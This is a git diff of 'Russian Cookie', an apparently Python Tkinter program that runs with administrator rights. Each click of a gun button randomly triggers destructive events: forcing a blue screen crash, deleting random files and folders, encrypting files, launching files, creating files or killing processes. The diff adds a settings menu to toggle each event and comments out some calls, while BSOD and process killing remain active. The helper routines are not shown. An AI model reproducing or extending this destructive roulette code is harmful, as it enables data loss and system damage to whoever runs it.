@@ -1,6 +1,5 @@
-import os, ctypes, sys, random, glob, shutil, string, webbrowser, simpleaudio, pyautogui, psutil, signal
+import os, ctypes, sys, random, glob, shutil, string, webbrowser, simpleaudio, pyautogui, psutil, signal, json
 from cryptography.fernet import Fernet
-# from tkinter import tix
 from tkinter import *
     
 
@@ -162,45 +161,86 @@ if ctypes.windll.shell32.IsUserAnAdmin():
         win.geometry('{}x{}+{}+{}'.format(width, height, x, y))
         win.deiconify()
 
-    def aboutRedirect():
-        webbrowser.open_new("https://github.com/BOuletteRusSe/RussianCookie")
+    ##########
+    # IN DEV #
+    ##########
 
-    def Shot():
-        gun_button.configure(image=gun)
+    def SettingsSaveWrite():
+        
+        global settings, save_settings
+        
+        print(save_settings)
+        
+        for k, b in save_settings.items(): settings["save_settings"][k] = b.get()
+            
+        with open("settings.json", "w") as j:
+            json.dump(settings, j, indent=4)
+            
+        with open("settings.json", "r") as j:
+            settings = json.load(j)
+            save_settings = settings["save_settings"]
+        
+        for k, b in save_settings.items(): 
+            ex = BooleanVar()
+            ex.set(b)
+            save_settings[k] = ex
+            
+        print(save_settings)
+
+    ##########
+    # IN DEV #
+    ##########
 
     def onClick():
         
         global text_action, gun_button, color
         
-        rda = round(random.random(), 2)
+        while True:
         
-        if not 0.01 < rda <= 0.2:
-            gun_button.configure(image=gunshot)
-            simpleaudio.WaveObject.from_wave_file("shot.wav").play()
-            window.after(100, Shot)
-        
-        if 0 <= rda <= 0.01: Bsod()
-        elif 0.01 < rda <= 0.2:
-            text_action = "You haven't had anything ... So far!"
-            color = "#cfcfb8"
-        elif 0.2 < rda <= 0.4:
-            text_action = delAll(rndFile(folder=True, file=True))
-            color = "#E20808"
-        elif 0.4 < rda <= 0.5:
-            text_action = cptFile(rndFile(file=True))
-            color = "#E208B4"
-        elif 0.5 < rda <= 0.7:
-            text_action = strFile(rndFile(file=True))
-            color = "#42BF20"
-        elif 0.7 < rda <= 0.8:
-            text_action = addFile(rndFile(folder=True))
-            color = "#0843E2"
-        elif 0.8 < rda <= 1:
-            text_action = kilProcess()
-            color = "#DA5914"
+            rda = round(random.random(), 2)
+            
+            if not 0.01 < rda <= 0.2 and save_settings["Sounds"].get():
+                gun_button.configure(image=gunshot)
+                shot_audio.play()
+                window.after(100, lambda: gun_button.configure(image=gun))
+            
+            if 0 <= rda <= 0.01 and save_settings["Bsod"].get(): Bsod()
+            elif 0.01 < rda <= 0.2 and save_settings["Nothing"].get():
+                text_action = "You haven't had anything ... So far!"
+                color = "#cfcfb8"
+                break
+            elif 0.2 < rda <= 0.4 and save_settings["Deleting"].get():
+                # text_action = delAll(rndFile(folder=True, file=True))
+                color = "#E20808"
+                break
+            elif 0.4 < rda <= 0.5 and save_settings["Encrypting"].get():
+                # text_action = cptFile(rndFile(file=True))
+                color = "#E208B4"
+                break
+            elif 0.5 < rda <= 0.7 and save_settings["Starting"].get():
+                # text_action = strFile(rndFile(file=True))
+                color = "#42BF20"
+                break
+            elif 0.7 < rda <= 0.8 and save_settings["Creating"].get():
+                text_action = addFile(rndFile(folder=True))
+                color = "#0843E2"
+                break
+            elif 0.8 < rda <= 1 and save_settings["Taskkill"].get():
+                text_action = kilProcess()
+                color = "#DA5914"
+                break
+            else:
+                c = True
+                for v in save_settings.values():
+                    print(v.get())
+                    if v.get():
+                        c = False
+                if c:
+                    text_action = "You must activate at least one event in the settings !"
+                    color = "#E20808"
+                    break
             
 
-    # window = tix.Tk()
     window = Tk()
     window.title("Russian Cookie")
     window.iconbitmap("logo.ico")
@@ -216,27 +256,49 @@ if ctypes.windll.shell32.IsUserAnAdmin():
     lcw = round(ww / 3.75)
     list_canvas = Canvas(window, width=lcw, height=mch, highlightthickness=0, bg='#292926')
     main_canvas = Canvas(window, width=mcw, height=mch, highlightthickness=0, bg='#4e4e47')
-
-    """
-    btnh = round(wh / 240)
-    btnw = round(ww / 100)
-    fs = round((ww * wh) / 30857.142857142857142857142857143)
-    f = font.Font(weight="bold", size=fs)
-    click_button = Button(window, activebackground="#B2380A", activeforeground="#736C6B", background="#A03807", command=onClick, foreground='#666261',
-                        font=f, height=btnh, text="Click to Destroy", width=btnw, relief=RIDGE)
-    main_canvas.create_window(round(mcw / 2), round(mcw / 2), window=click_button)
-    """
     
+    ##################
+    # CONTINUER ICI #
+    #################
+    
+    with open("settings.json", "r") as j:
+        settings = json.load(j)
+        save_settings = settings["save_settings"]
+    
+    for k, b in save_settings.items(): 
+        ex = BooleanVar()
+        ex.set(b)
+        save_settings[k] = ex
+    
+    menu = Menu(window, tearoff=0)
+    window.config(menu=menu)
+    options_menu = Menu(menu, tearoff=0, bg='#292926', fg="white")
+    others_menu = Menu(menu, tearoff=0, bg='#292926', fg="white")
+    
+    menu.add_cascade(label="Options", menu=options_menu)
+    menu.add_cascade(label="Others", menu=others_menu)
+    
+    options_menu.add_command(label="Percentages", command=lambda: print("Pourcentage"))
+    others_menu.add_command(label="About...", command=lambda: webbrowser.open_new("https://github.com/BOuletteRusSe/RussianCookie"))
+    
+    options_menu.add_checkbutton(label="Sounds", onvalue=True, offvalue=False, variable=save_settings["Sounds"], selectcolor="red")
+    options_menu.add_checkbutton(label="Deleting", onvalue=True, offvalue=False, variable=save_settings["Deleting"], selectcolor="red")
+    options_menu.add_checkbutton(label="Encrypting", onvalue=True, offvalue=False, variable=save_settings["Encrypting"], selectcolor="red")
+    options_menu.add_checkbutton(label="Starting", onvalue=True, offvalue=False, variable=save_settings["Starting"], selectcolor="red")
+    options_menu.add_checkbutton(label="Creating", onvalue=True, offvalue=False, variable=save_settings["Creating"], selectcolor="red")
+    options_menu.add_checkbutton(label="Taskkill", onvalue=True, offvalue=False, variable=save_settings["Taskkill"], selectcolor="red")
+    options_menu.add_checkbutton(label="BSOD", onvalue=True, offvalue=False, variable=save_settings["Bsod"], selectcolor="red")
+    options_menu.add_checkbutton(label="Nothing", onvalue=True, offvalue=False, variable=save_settings["Nothing"], selectcolor="red")
+    
+    ##################
+    # CONTINUER ICI #
+    #################
+
+    shot_audio = simpleaudio.WaveObject.from_wave_file("shot.wav")
     gun = PhotoImage(file="gun.png")
     gunshot = PhotoImage(file="gunshot.png")
     gun_button = Button(window, background="#4e4e47", activebackground="#4e4e47", command=onClick, relief=FLAT, image=gun, borderwidth=0)
     main_canvas.create_window(round(mcw / 2), 375, window=gun_button)
-    
-    about_img = PhotoImage(file="about.png")
-    about_button = Button(window, image=about_img, background="#4e4e47", relief=FLAT, command=aboutRedirect)
-    main_canvas.create_window(50, 50, window=about_button)
-    # bal = tix.Balloon()
-    # bal.bind_widget(about_button, msg='About this project')
 
     h = 0
     le = round((ww * wh) / 72000)
